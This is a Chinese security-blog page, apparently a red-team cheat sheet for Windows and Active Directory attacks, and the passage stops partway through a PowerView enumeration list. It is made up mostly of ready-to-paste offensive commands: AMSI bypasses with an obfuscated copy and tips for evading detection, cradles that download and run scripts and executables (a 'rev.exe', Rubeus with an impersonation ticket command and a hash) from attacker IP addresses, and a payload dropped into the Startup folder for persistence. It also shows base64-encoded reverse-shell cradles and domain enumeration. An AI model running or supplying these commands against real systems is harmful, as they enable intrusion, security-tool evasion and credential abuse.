<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Windows和Active Directory备忘单和命令参考, 信息安全初学者">
    <meta name="description" content="网络安全|渗透测试|Python|漏洞复现">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>Windows和Active Directory备忘单和命令参考 | 信息安全初学者</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">信息安全初学者</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">信息安全初学者</div>
        <div class="logo-desc">
            
            网络安全|渗透测试|Python|漏洞复现
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">Windows和Active Directory备忘单和命令参考</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95/">
                                <span class="chip bg-color">备忘录</span>
                            </a>
                        
                            <a href="/tags/AD/">
                                <span class="chip bg-color">AD</span>
                            </a>
                        
                            <a href="/tags/%E5%9F%9F/">
                                <span class="chip bg-color">域</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E5%A4%87%E5%BF%98%E5%BD%95/" class="post-category">
                                备忘录
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2021-06-08
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="Windows和Active-Directory备忘单和命令参考"><a href="#Windows和Active-Directory备忘单和命令参考" class="headerlink" title="Windows和Active Directory备忘单和命令参考"></a>Windows和Active Directory备忘单和命令参考</h1><h2 id="General"><a href="#General" class="headerlink" title="General"></a>General</h2><h3 id="PowerShell-AMSI-Bypass"><a href="#PowerShell-AMSI-Bypass" class="headerlink" title="PowerShell AMSI Bypass"></a>PowerShell AMSI Bypass</h3><p>修补AMSI将有助于绕过执行标记为恶意的<code>PowerShell</code>脚本（例如<code>PowerView</code>）时触发的AV警告。请勿在秘密操作中按原样使用，因为它们会被标记<code>flag</code>。通过更改脚本以胜过基于签名的检测，可以混淆甚至更好地完全消除AMSI绕过的需要。</p>
<span id="more"></span>

<p>‘Plain’ AMSI bypass:</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.AmsiUtils'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>GetField<span class="token punctuation">(</span><span class="token string">'amsiInitFailed'</span><span class="token punctuation">,</span><span class="token string">'NonPublic,Static'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SetValue<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span><span class="token boolean">$true</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>用于复制粘贴的混淆示例：</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">sET-ItEM</span> <span class="token punctuation">(</span> <span class="token string">'V'</span><span class="token operator">+</span><span class="token string">'aR'</span> <span class="token operator">+</span>  <span class="token string">'IA'</span> <span class="token operator">+</span> <span class="token string">'blE:1q2'</span>  <span class="token operator">+</span> <span class="token string">'uZx'</span>  <span class="token punctuation">)</span> <span class="token punctuation">(</span> <span class="token namespace">[TYpE]</span><span class="token punctuation">(</span>  <span class="token string">"&amp;#123;1&amp;#125;&amp;#123;0&amp;#125;"</span><span class="token operator">-</span>F<span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'rE'</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">;</span>    <span class="token punctuation">(</span>    <span class="token function">GeT-VariaBle</span>  <span class="token punctuation">(</span> <span class="token string">"1Q2U"</span>  <span class="token operator">+</span><span class="token string">"zX"</span>  <span class="token punctuation">)</span>  <span class="token operator">-</span>VaL <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"A`ss`Embly"</span><span class="token punctuation">.</span><span class="token string">"GET`TY`Pe"</span><span class="token punctuation">(</span><span class="token punctuation">(</span>  <span class="token string">"&amp;#123;6&amp;#125;&amp;#123;3&amp;#125;&amp;#123;1&amp;#125;&amp;#123;4&amp;#125;&amp;#123;2&amp;#125;&amp;#123;0&amp;#125;&amp;#123;5&amp;#125;"</span> <span class="token operator">-</span>f<span class="token string">'Util'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'Amsi'</span><span class="token punctuation">,</span><span class="token string">'.Management.'</span><span class="token punctuation">,</span><span class="token string">'utomation.'</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token string">'System'</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"g`etf`iElD"</span><span class="token punctuation">(</span>  <span class="token punctuation">(</span> <span class="token string">"&amp;#123;0&amp;#125;&amp;#123;2&amp;#125;&amp;#123;1&amp;#125;"</span> <span class="token operator">-</span>f<span class="token string">'amsi'</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token string">'InitFaile'</span>  <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>  <span class="token string">"&amp;#123;2&amp;#125;&amp;#123;4&amp;#125;&amp;#123;0&amp;#125;&amp;#123;1&amp;#125;&amp;#123;3&amp;#125;"</span> <span class="token operator">-</span>f <span class="token string">'Stat'</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'NonPubli'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'c,'</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"sE`T`VaLUE"</span><span class="token punctuation">(</span>  $&amp;#123<span class="token punctuation">;</span>n`ULl&amp;#125<span class="token punctuation">;</span><span class="token punctuation">,</span>$&amp;#123<span class="token punctuation">;</span>t`RuE&amp;#125<span class="token punctuation">;</span> <span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>另一个旁路，PowerShell自动记录未检测到：</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token namespace">[Delegate]</span>::CreateDelegate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Func``3[String,<span class="token function"> $<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token namespace">[String]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Reflection.Bindin'</span><span class="token operator">+</span><span class="token string">'gFlags'</span><span class="token punctuation">)</span></span>).FullName), System.Reflection.FieldInfo]"</span> <span class="token operator">-as</span> <span class="token namespace">[String]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.T'</span><span class="token operator">+</span><span class="token string">'ype'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[Object]</span><span class="token punctuation">(</span><span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.AmsiUtils'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'GetFie'</span><span class="token operator">+</span><span class="token string">'ld'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token string">'amsiInitFailed'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Non'</span><span class="token operator">+</span><span class="token string">'Public,Static'</span><span class="token punctuation">)</span> <span class="token operator">-as</span> <span class="token namespace">[String]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Reflection.Bindin'</span><span class="token operator">+</span><span class="token string">'gFlags'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SetValue<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span><span class="token boolean">$True</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>更多绕过点击<a target="_blank" rel="noopener" href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">这里</a>。对于混淆，请检查<a target="_blank" rel="noopener" href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a>，或在<a target="_blank" rel="noopener" href="https://amsi.fail/">amsi.fail</a>上获取预先生成的混淆版本。</p>
</blockquote>
<h3 id="PowerShell-one-liners"><a href="#PowerShell-one-liners" class="headerlink" title="PowerShell one-liners"></a>PowerShell one-liners</h3><h4 id="反射式加载PowerShell脚本"><a href="#反射式加载PowerShell脚本" class="headerlink" title="反射式加载PowerShell脚本"></a><strong>反射式加载PowerShell脚本</strong></h4><p>代理感知：</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'http://10.10.16.7/PowerView.obs.ps1'</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>不了解代理：</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token variable">$h</span>=<span class="token function">new-object</span> <span class="token operator">-</span>com WinHttp<span class="token punctuation">.</span>WinHttpRequest<span class="token punctuation">.</span>5<span class="token punctuation">.</span>1<span class="token punctuation">;</span><span class="token variable">$h</span><span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'http://10.10.16.7/PowerView.obs.ps1'</span><span class="token punctuation">,</span><span class="token boolean">$false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$h</span><span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">iex</span> <span class="token variable">$h</span><span class="token punctuation">.</span>responseText
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>同样，这可能会被标记flag。有关opsec安全的下载通讯座，请查看<a target="_blank" rel="noopener" href="https://github.com/danielbohannon/Invoke-CradleCrafter">Invoke-CradleCrafter</a>。</p>
</blockquote>
<h4 id="反射式加载C＃程序集"><a href="#反射式加载C＃程序集" class="headerlink" title="反射式加载C＃程序集"></a><strong>反射式加载C＃程序集</strong></h4><p>在运行该类之前，请确保所引用的类和main方法为Public。请注意，为此可能需要全过程的AMSI旁路，<a target="_blank" rel="noopener" href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/">有关详细信息</a>，<a target="_blank" rel="noopener" href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/">请参见此处</a>。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># Download and run assembly without arguments</span>
<span class="token variable">$data</span> = <span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadData<span class="token punctuation">(</span><span class="token string">'http://10.10.16.7/rev.exe'</span><span class="token punctuation">)</span>
<span class="token variable">$assem</span> = <span class="token namespace">[System.Reflection.Assembly]</span>::Load<span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
<span class="token namespace">[rev.Program]</span>::Main<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>Split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Download and run Rubeus, with arguments</span>
<span class="token variable">$data</span> = <span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadData<span class="token punctuation">(</span><span class="token string">'http://10.10.16.7/Rubeus.exe'</span><span class="token punctuation">)</span>
<span class="token variable">$assem</span> = <span class="token namespace">[System.Reflection.Assembly]</span>::Load<span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
<span class="token namespace">[Rubeus.Program]</span>::Main<span class="token punctuation">(</span><span class="token string">"s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt"</span><span class="token punctuation">.</span>Split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Execute a specific method from an assembly (e.g. a DLL)</span>
<span class="token variable">$data</span> = <span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadData<span class="token punctuation">(</span><span class="token string">'http://10.10.16.7/lib.dll'</span><span class="token punctuation">)</span>
<span class="token variable">$assem</span> = <span class="token namespace">[System.Reflection.Assembly]</span>::Load<span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
<span class="token variable">$class</span> = <span class="token variable">$assem</span><span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">"ClassLibrary1.Class1"</span><span class="token punctuation">)</span>
<span class="token variable">$method</span> = <span class="token variable">$class</span><span class="token punctuation">.</span>GetMethod<span class="token punctuation">(</span><span class="token string">"runner"</span><span class="token punctuation">)</span>
<span class="token variable">$method</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span>0<span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># Any version</span>
<span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadFile<span class="token punctuation">(</span><span class="token string">"http://192.168.119.155/PowerUp.ps1"</span><span class="token punctuation">,</span> <span class="token string">"C:\Windows\Temp\PowerUp.ps1"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Powershell 4+</span>
<span class="token comment" spellcheck="true">## You can use 'IWR' as a shorthand</span>
<span class="token function">Invoke-WebRequest</span> <span class="token string">"http://10.10.16.7/Incnspc64.exe"</span> <span class="token operator">-</span>OutFile <span class="token string">"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Incnspc64.exe"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="编码命令"><a href="#编码命令" class="headerlink" title="编码命令"></a>编码命令</h4><p>编码一线：</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token variable">$command</span> = <span class="token string">'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")'</span>
<span class="token variable">$bytes</span> = <span class="token namespace">[System.Text.Encoding]</span>::Unicode<span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span>
<span class="token variable">$encodedCommand</span> = <span class="token namespace">[Convert]</span>::ToBase64String<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>或以上版本的Linux：</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")'</span> <span class="token operator">|</span> <span class="token function">iconv</span> -t utf-16le <span class="token operator">|</span> base64 -w 0
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>对现有脚本进行编码，然后复制到剪贴板：</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token namespace">[System.Convert]</span>::ToBase64String<span class="token punctuation">(</span><span class="token namespace">[System.IO.File]</span>::ReadAllBytes<span class="token punctuation">(</span><span class="token string">'c:\path\to\PowerView.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> clip
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>运行它，绕过执行策略。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell">Powershell <span class="token operator">-</span>EncodedCommand <span class="token variable">$encodedCommand</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>如果您方便使用Nishang，则可以使用<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Encode.ps1">Invoke-Encode.ps1</a>。</p>
</blockquote>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a><strong>枚举</strong></h2><h3 id="使用PowerView进行AD枚举"><a href="#使用PowerView进行AD枚举" class="headerlink" title="使用PowerView进行AD枚举"></a><strong>使用PowerView进行AD枚举</strong></h3><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 获取当前域中的所有用户</span>
Get<span class="token operator">-</span>NetUser <span class="token punctuation">|</span> <span class="token function">select</span> <span class="token operator">-</span>ExpandProperty cn

<span class="token comment" spellcheck="true"># 获取当前域中的所有计算机</span>
Get<span class="token operator">-</span>NetComputer

<span class="token comment" spellcheck="true"># 获取当前林中的所有域</span>
Get<span class="token operator">-</span>NetForestDomain

<span class="token comment" spellcheck="true"># 获取域/林信任</span>
Get<span class="token operator">-</span>NetDomainTrust
Get<span class="token operator">-</span>NetForestTrust

<span class="token comment" spellcheck="true"># 获取DA组的信息</span>
Get<span class="token operator">-</span>NetGroup <span class="token operator">-</span>GroupName <span class="token string">"Domain Admins"</span>

<span class="token comment" spellcheck="true"># 查找DA组的成员</span>
Get<span class="token operator">-</span>NetGroupMember <span class="token operator">-</span>GroupName <span class="token string">"Domain Admins"</span> <span class="token punctuation">|</span> <span class="token function">select</span> <span class="token operator">-</span>ExpandProperty membername

<span class="token comment" spellcheck="true"># 在域中查找有趣的共享，忽略默认共享</span>
Invoke<span class="token operator">-</span>ShareFinder <span class="token operator">-</span>ExcludeStandard <span class="token operator">-</span>ExcludePrint <span class="token operator">-</span>ExcludeIPC

<span class="token comment" spellcheck="true"># 获取当前域的OU</span>
Get<span class="token operator">-</span>NetOU <span class="token operator">-</span>FullData

<span class="token comment" spellcheck="true"># 在OU中获取计算机</span>
<span class="token comment" spellcheck="true"># %&amp;#123;&amp;#125; 是循环语句</span>
Get<span class="token operator">-</span>NetOU <span class="token operator">-</span>OUName StudentMachines <span class="token punctuation">|</span> <span class="token operator">%</span>&amp;<span class="token comment" spellcheck="true">#123;Get-NetComputer -ADSPath $_&amp;#125;</span>

<span class="token comment" spellcheck="true"># 获取适用于特定OU的GPO</span>
Get<span class="token operator">-</span>NetOU <span class="token operator">*</span>student<span class="token operator">*</span> <span class="token punctuation">|</span> <span class="token function">select</span> gplink
Get<span class="token operator">-</span>NetGPO <span class="token operator">-</span>Name <span class="token string">"&amp;#123;3E04167E-C2B6-4A9A-8FB7-C811158DC97C&amp;#125;"</span>

<span class="token comment" spellcheck="true"># 获取通过GPO设置的受限组，查找通过域强制设置的有趣组成员身份</span>
Get<span class="token operator">-</span>NetGPOGroup

<span class="token comment" spellcheck="true"># 获取特定对象的传入ACL</span>
Get<span class="token operator">-</span>ObjectACL <span class="token operator">-</span>SamAccountName <span class="token string">"Domain Admins"</span> <span class="token operator">-</span>ResolveGUIDs <span class="token punctuation">|</span> <span class="token function">Select</span> IdentityReference<span class="token punctuation">,</span>ActiveDirectoryRights

<span class="token comment" spellcheck="true"># 查找整个域的有趣ACL，以可读（从左到右）格式显示</span>
Find<span class="token operator">-</span>InterestingDomainAcl <span class="token punctuation">|</span> <span class="token function">select</span> identityreferencename<span class="token punctuation">,</span>activedirectoryrights<span class="token punctuation">,</span>acetype<span class="token punctuation">,</span>objectdn <span class="token punctuation">|</span> ?&amp;<span class="token comment" spellcheck="true">#123;$_.IdentityReferenceName -NotContains "DnsAdmins"&amp;#125; | ft</span>

<span class="token comment" spellcheck="true"># 获取特定用户或组的有趣的传出ACL</span>
